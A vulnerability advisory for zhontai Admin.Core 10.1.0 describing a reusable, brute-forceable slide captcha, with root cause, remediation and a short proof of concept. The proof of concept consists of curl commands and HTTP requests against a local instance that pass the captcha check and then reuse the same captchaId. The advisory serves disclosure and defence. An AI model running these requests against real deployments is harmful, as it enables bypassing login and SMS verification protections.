# Admin.Core — Slide captcha oracle and reusable captchaId (AC-VULN-009)

| Field | Value |
|-------|-------|
| Vendor | zhontai |
| Product | Admin.Core (中台Admin) |
| Version | 10.1.0 |
| Type | Improper Authentication |
| CWE | CWE-287 / CWE-307 |
| Authentication | None |
| Severity | High |

## Summary

`CaptchaService.CheckAsync` validates with `removeIfSuccess: false`. Default SimpleValidator accepts percent within tolerance, enabling brute-force and reuse of the same captchaId for login/SMS flows.

## Root cause

Captcha check does not consume ticket; weak validator + anonymous check API.

## Exploit / reproduction

Generate then check until `data.result=0`; repeat check with same `captchaId`.

```bash
curl -s -X POST 'http://127.0.0.1:18010/api/admin/captcha/generate'
curl -s -X POST 'http://127.0.0.1:18010/api/admin/captcha/check?captchaId=ID' -H 'Content-Type: application/json' -d '@track.json'
```


## PoC (Yakit)

```http
POST /api/admin/captcha/generate HTTP/1.1
Host: 127.0.0.1:18010

---
POST /api/admin/captcha/check?captchaId=CAPTCHA_ID HTTP/1.1
Host: 127.0.0.1:18010
Content-Type: application/json

{"percent":0.5,"backgroundImageWidth":280,"backgroundImageHeight":155,"sliderImageWidth":47,"sliderImageHeight":155,"startTime":"...","endTime":"...","tracks":[{"x":100,"y":0,"t":5}]}
```

Expected: data.result=0 Success; repeat check with same captchaId still Success

## Screenshots

Dynamic verify: check Success then reuse same captchaId still Success.

## Impact

Bypass slide captcha for login / SMS / email code endpoints.

## Remediation

removeIfSuccess=true; use BasicValidator; rate-limit generate/check; one-time tickets.

## References

- Local report: `../POC_VERIFICATION_REPORT.md`
- Scripts: `poc_verify/admincore_poc_verify.py`, `admincore_jwt_forge.py`
- Upstream: https://github.com/zhontai/Admin.Core
